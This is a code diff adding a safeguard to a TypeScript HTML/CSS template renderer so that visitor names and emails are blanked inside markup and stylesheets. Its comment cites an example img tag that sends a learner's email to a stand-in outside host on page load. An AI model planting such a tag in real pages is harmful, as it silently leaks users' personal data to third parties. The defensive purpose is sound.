@@ -235,14 +235,46 @@ function render(
   return evaluate(parse(tokenize(source)), [ctx], escape);
 }
 
+/**
+ * Personal data about the visitor may be shown TO them as text, and nowhere
+ * else.
+ *
+ * `{{ user.email }}` in a paragraph greets the learner. The same tag inside
+ * `<img src="https://elsewhere.test/?e={{ user.email }}">`, or inside a
+ * stylesheet's `url(…)`, sends that learner's email address to a third party
+ * the moment the page loads — no script needed, and every signed-in visitor is
+ * affected. So these paths are blanked wherever a value could become part of a
+ * request: inside any tag (attribute values) and anywhere in CSS.
+ *
+ * The check is on the SOURCE, before substitution: a tag is "inside markup"
+ * when the last `<` before it has no `>` after it. Loop and condition tags
+ * are untouched — `{{#if user.isAuthenticated}}` reveals nothing by itself.
+ */
+const PERSONAL_PATHS = /^(?:user\.(?:name|email)|progress\.enrollments)$/;
+const PERSONAL_TAG = /\{\{\s*(user\.(?:name|email))\s*\}\}/g;
+
+function blankPersonalDataInMarkup(source: string): string {
+  return source.replace(PERSONAL_TAG, (tag, _path, offset: number) => {
+    const before = source.slice(0, offset);
+    const insideTag = before.lastIndexOf("<") > before.lastIndexOf(">");
+    return insideTag ? "" : tag;
+  });
+}
+
+/** Whether a variable path names personal data about the visitor. */
+export function isPersonalPath(path: string): boolean {
+  return PERSONAL_PATHS.test(path);
+}
+
 /** Render author HTML. Every substituted value is HTML-escaped. */
 export function renderTemplate(source: string, ctx: VariableContext): string {
-  return render(source, ctx, escapeHtml);
+  return render(blankPersonalDataInMarkup(source), ctx, escapeHtml);
 }
 
 /** Render author CSS. Values are reduced to a safe character allowlist. */
 export function renderCssTemplate(source: string, ctx: VariableContext): string {
-  return render(source, ctx, escapeCssValue);
+  // No personal data in a stylesheet at all: every value there can end up in a url().
+  return render(source.replace(PERSONAL_TAG, ""), ctx, escapeCssValue);
 }
 
 /**
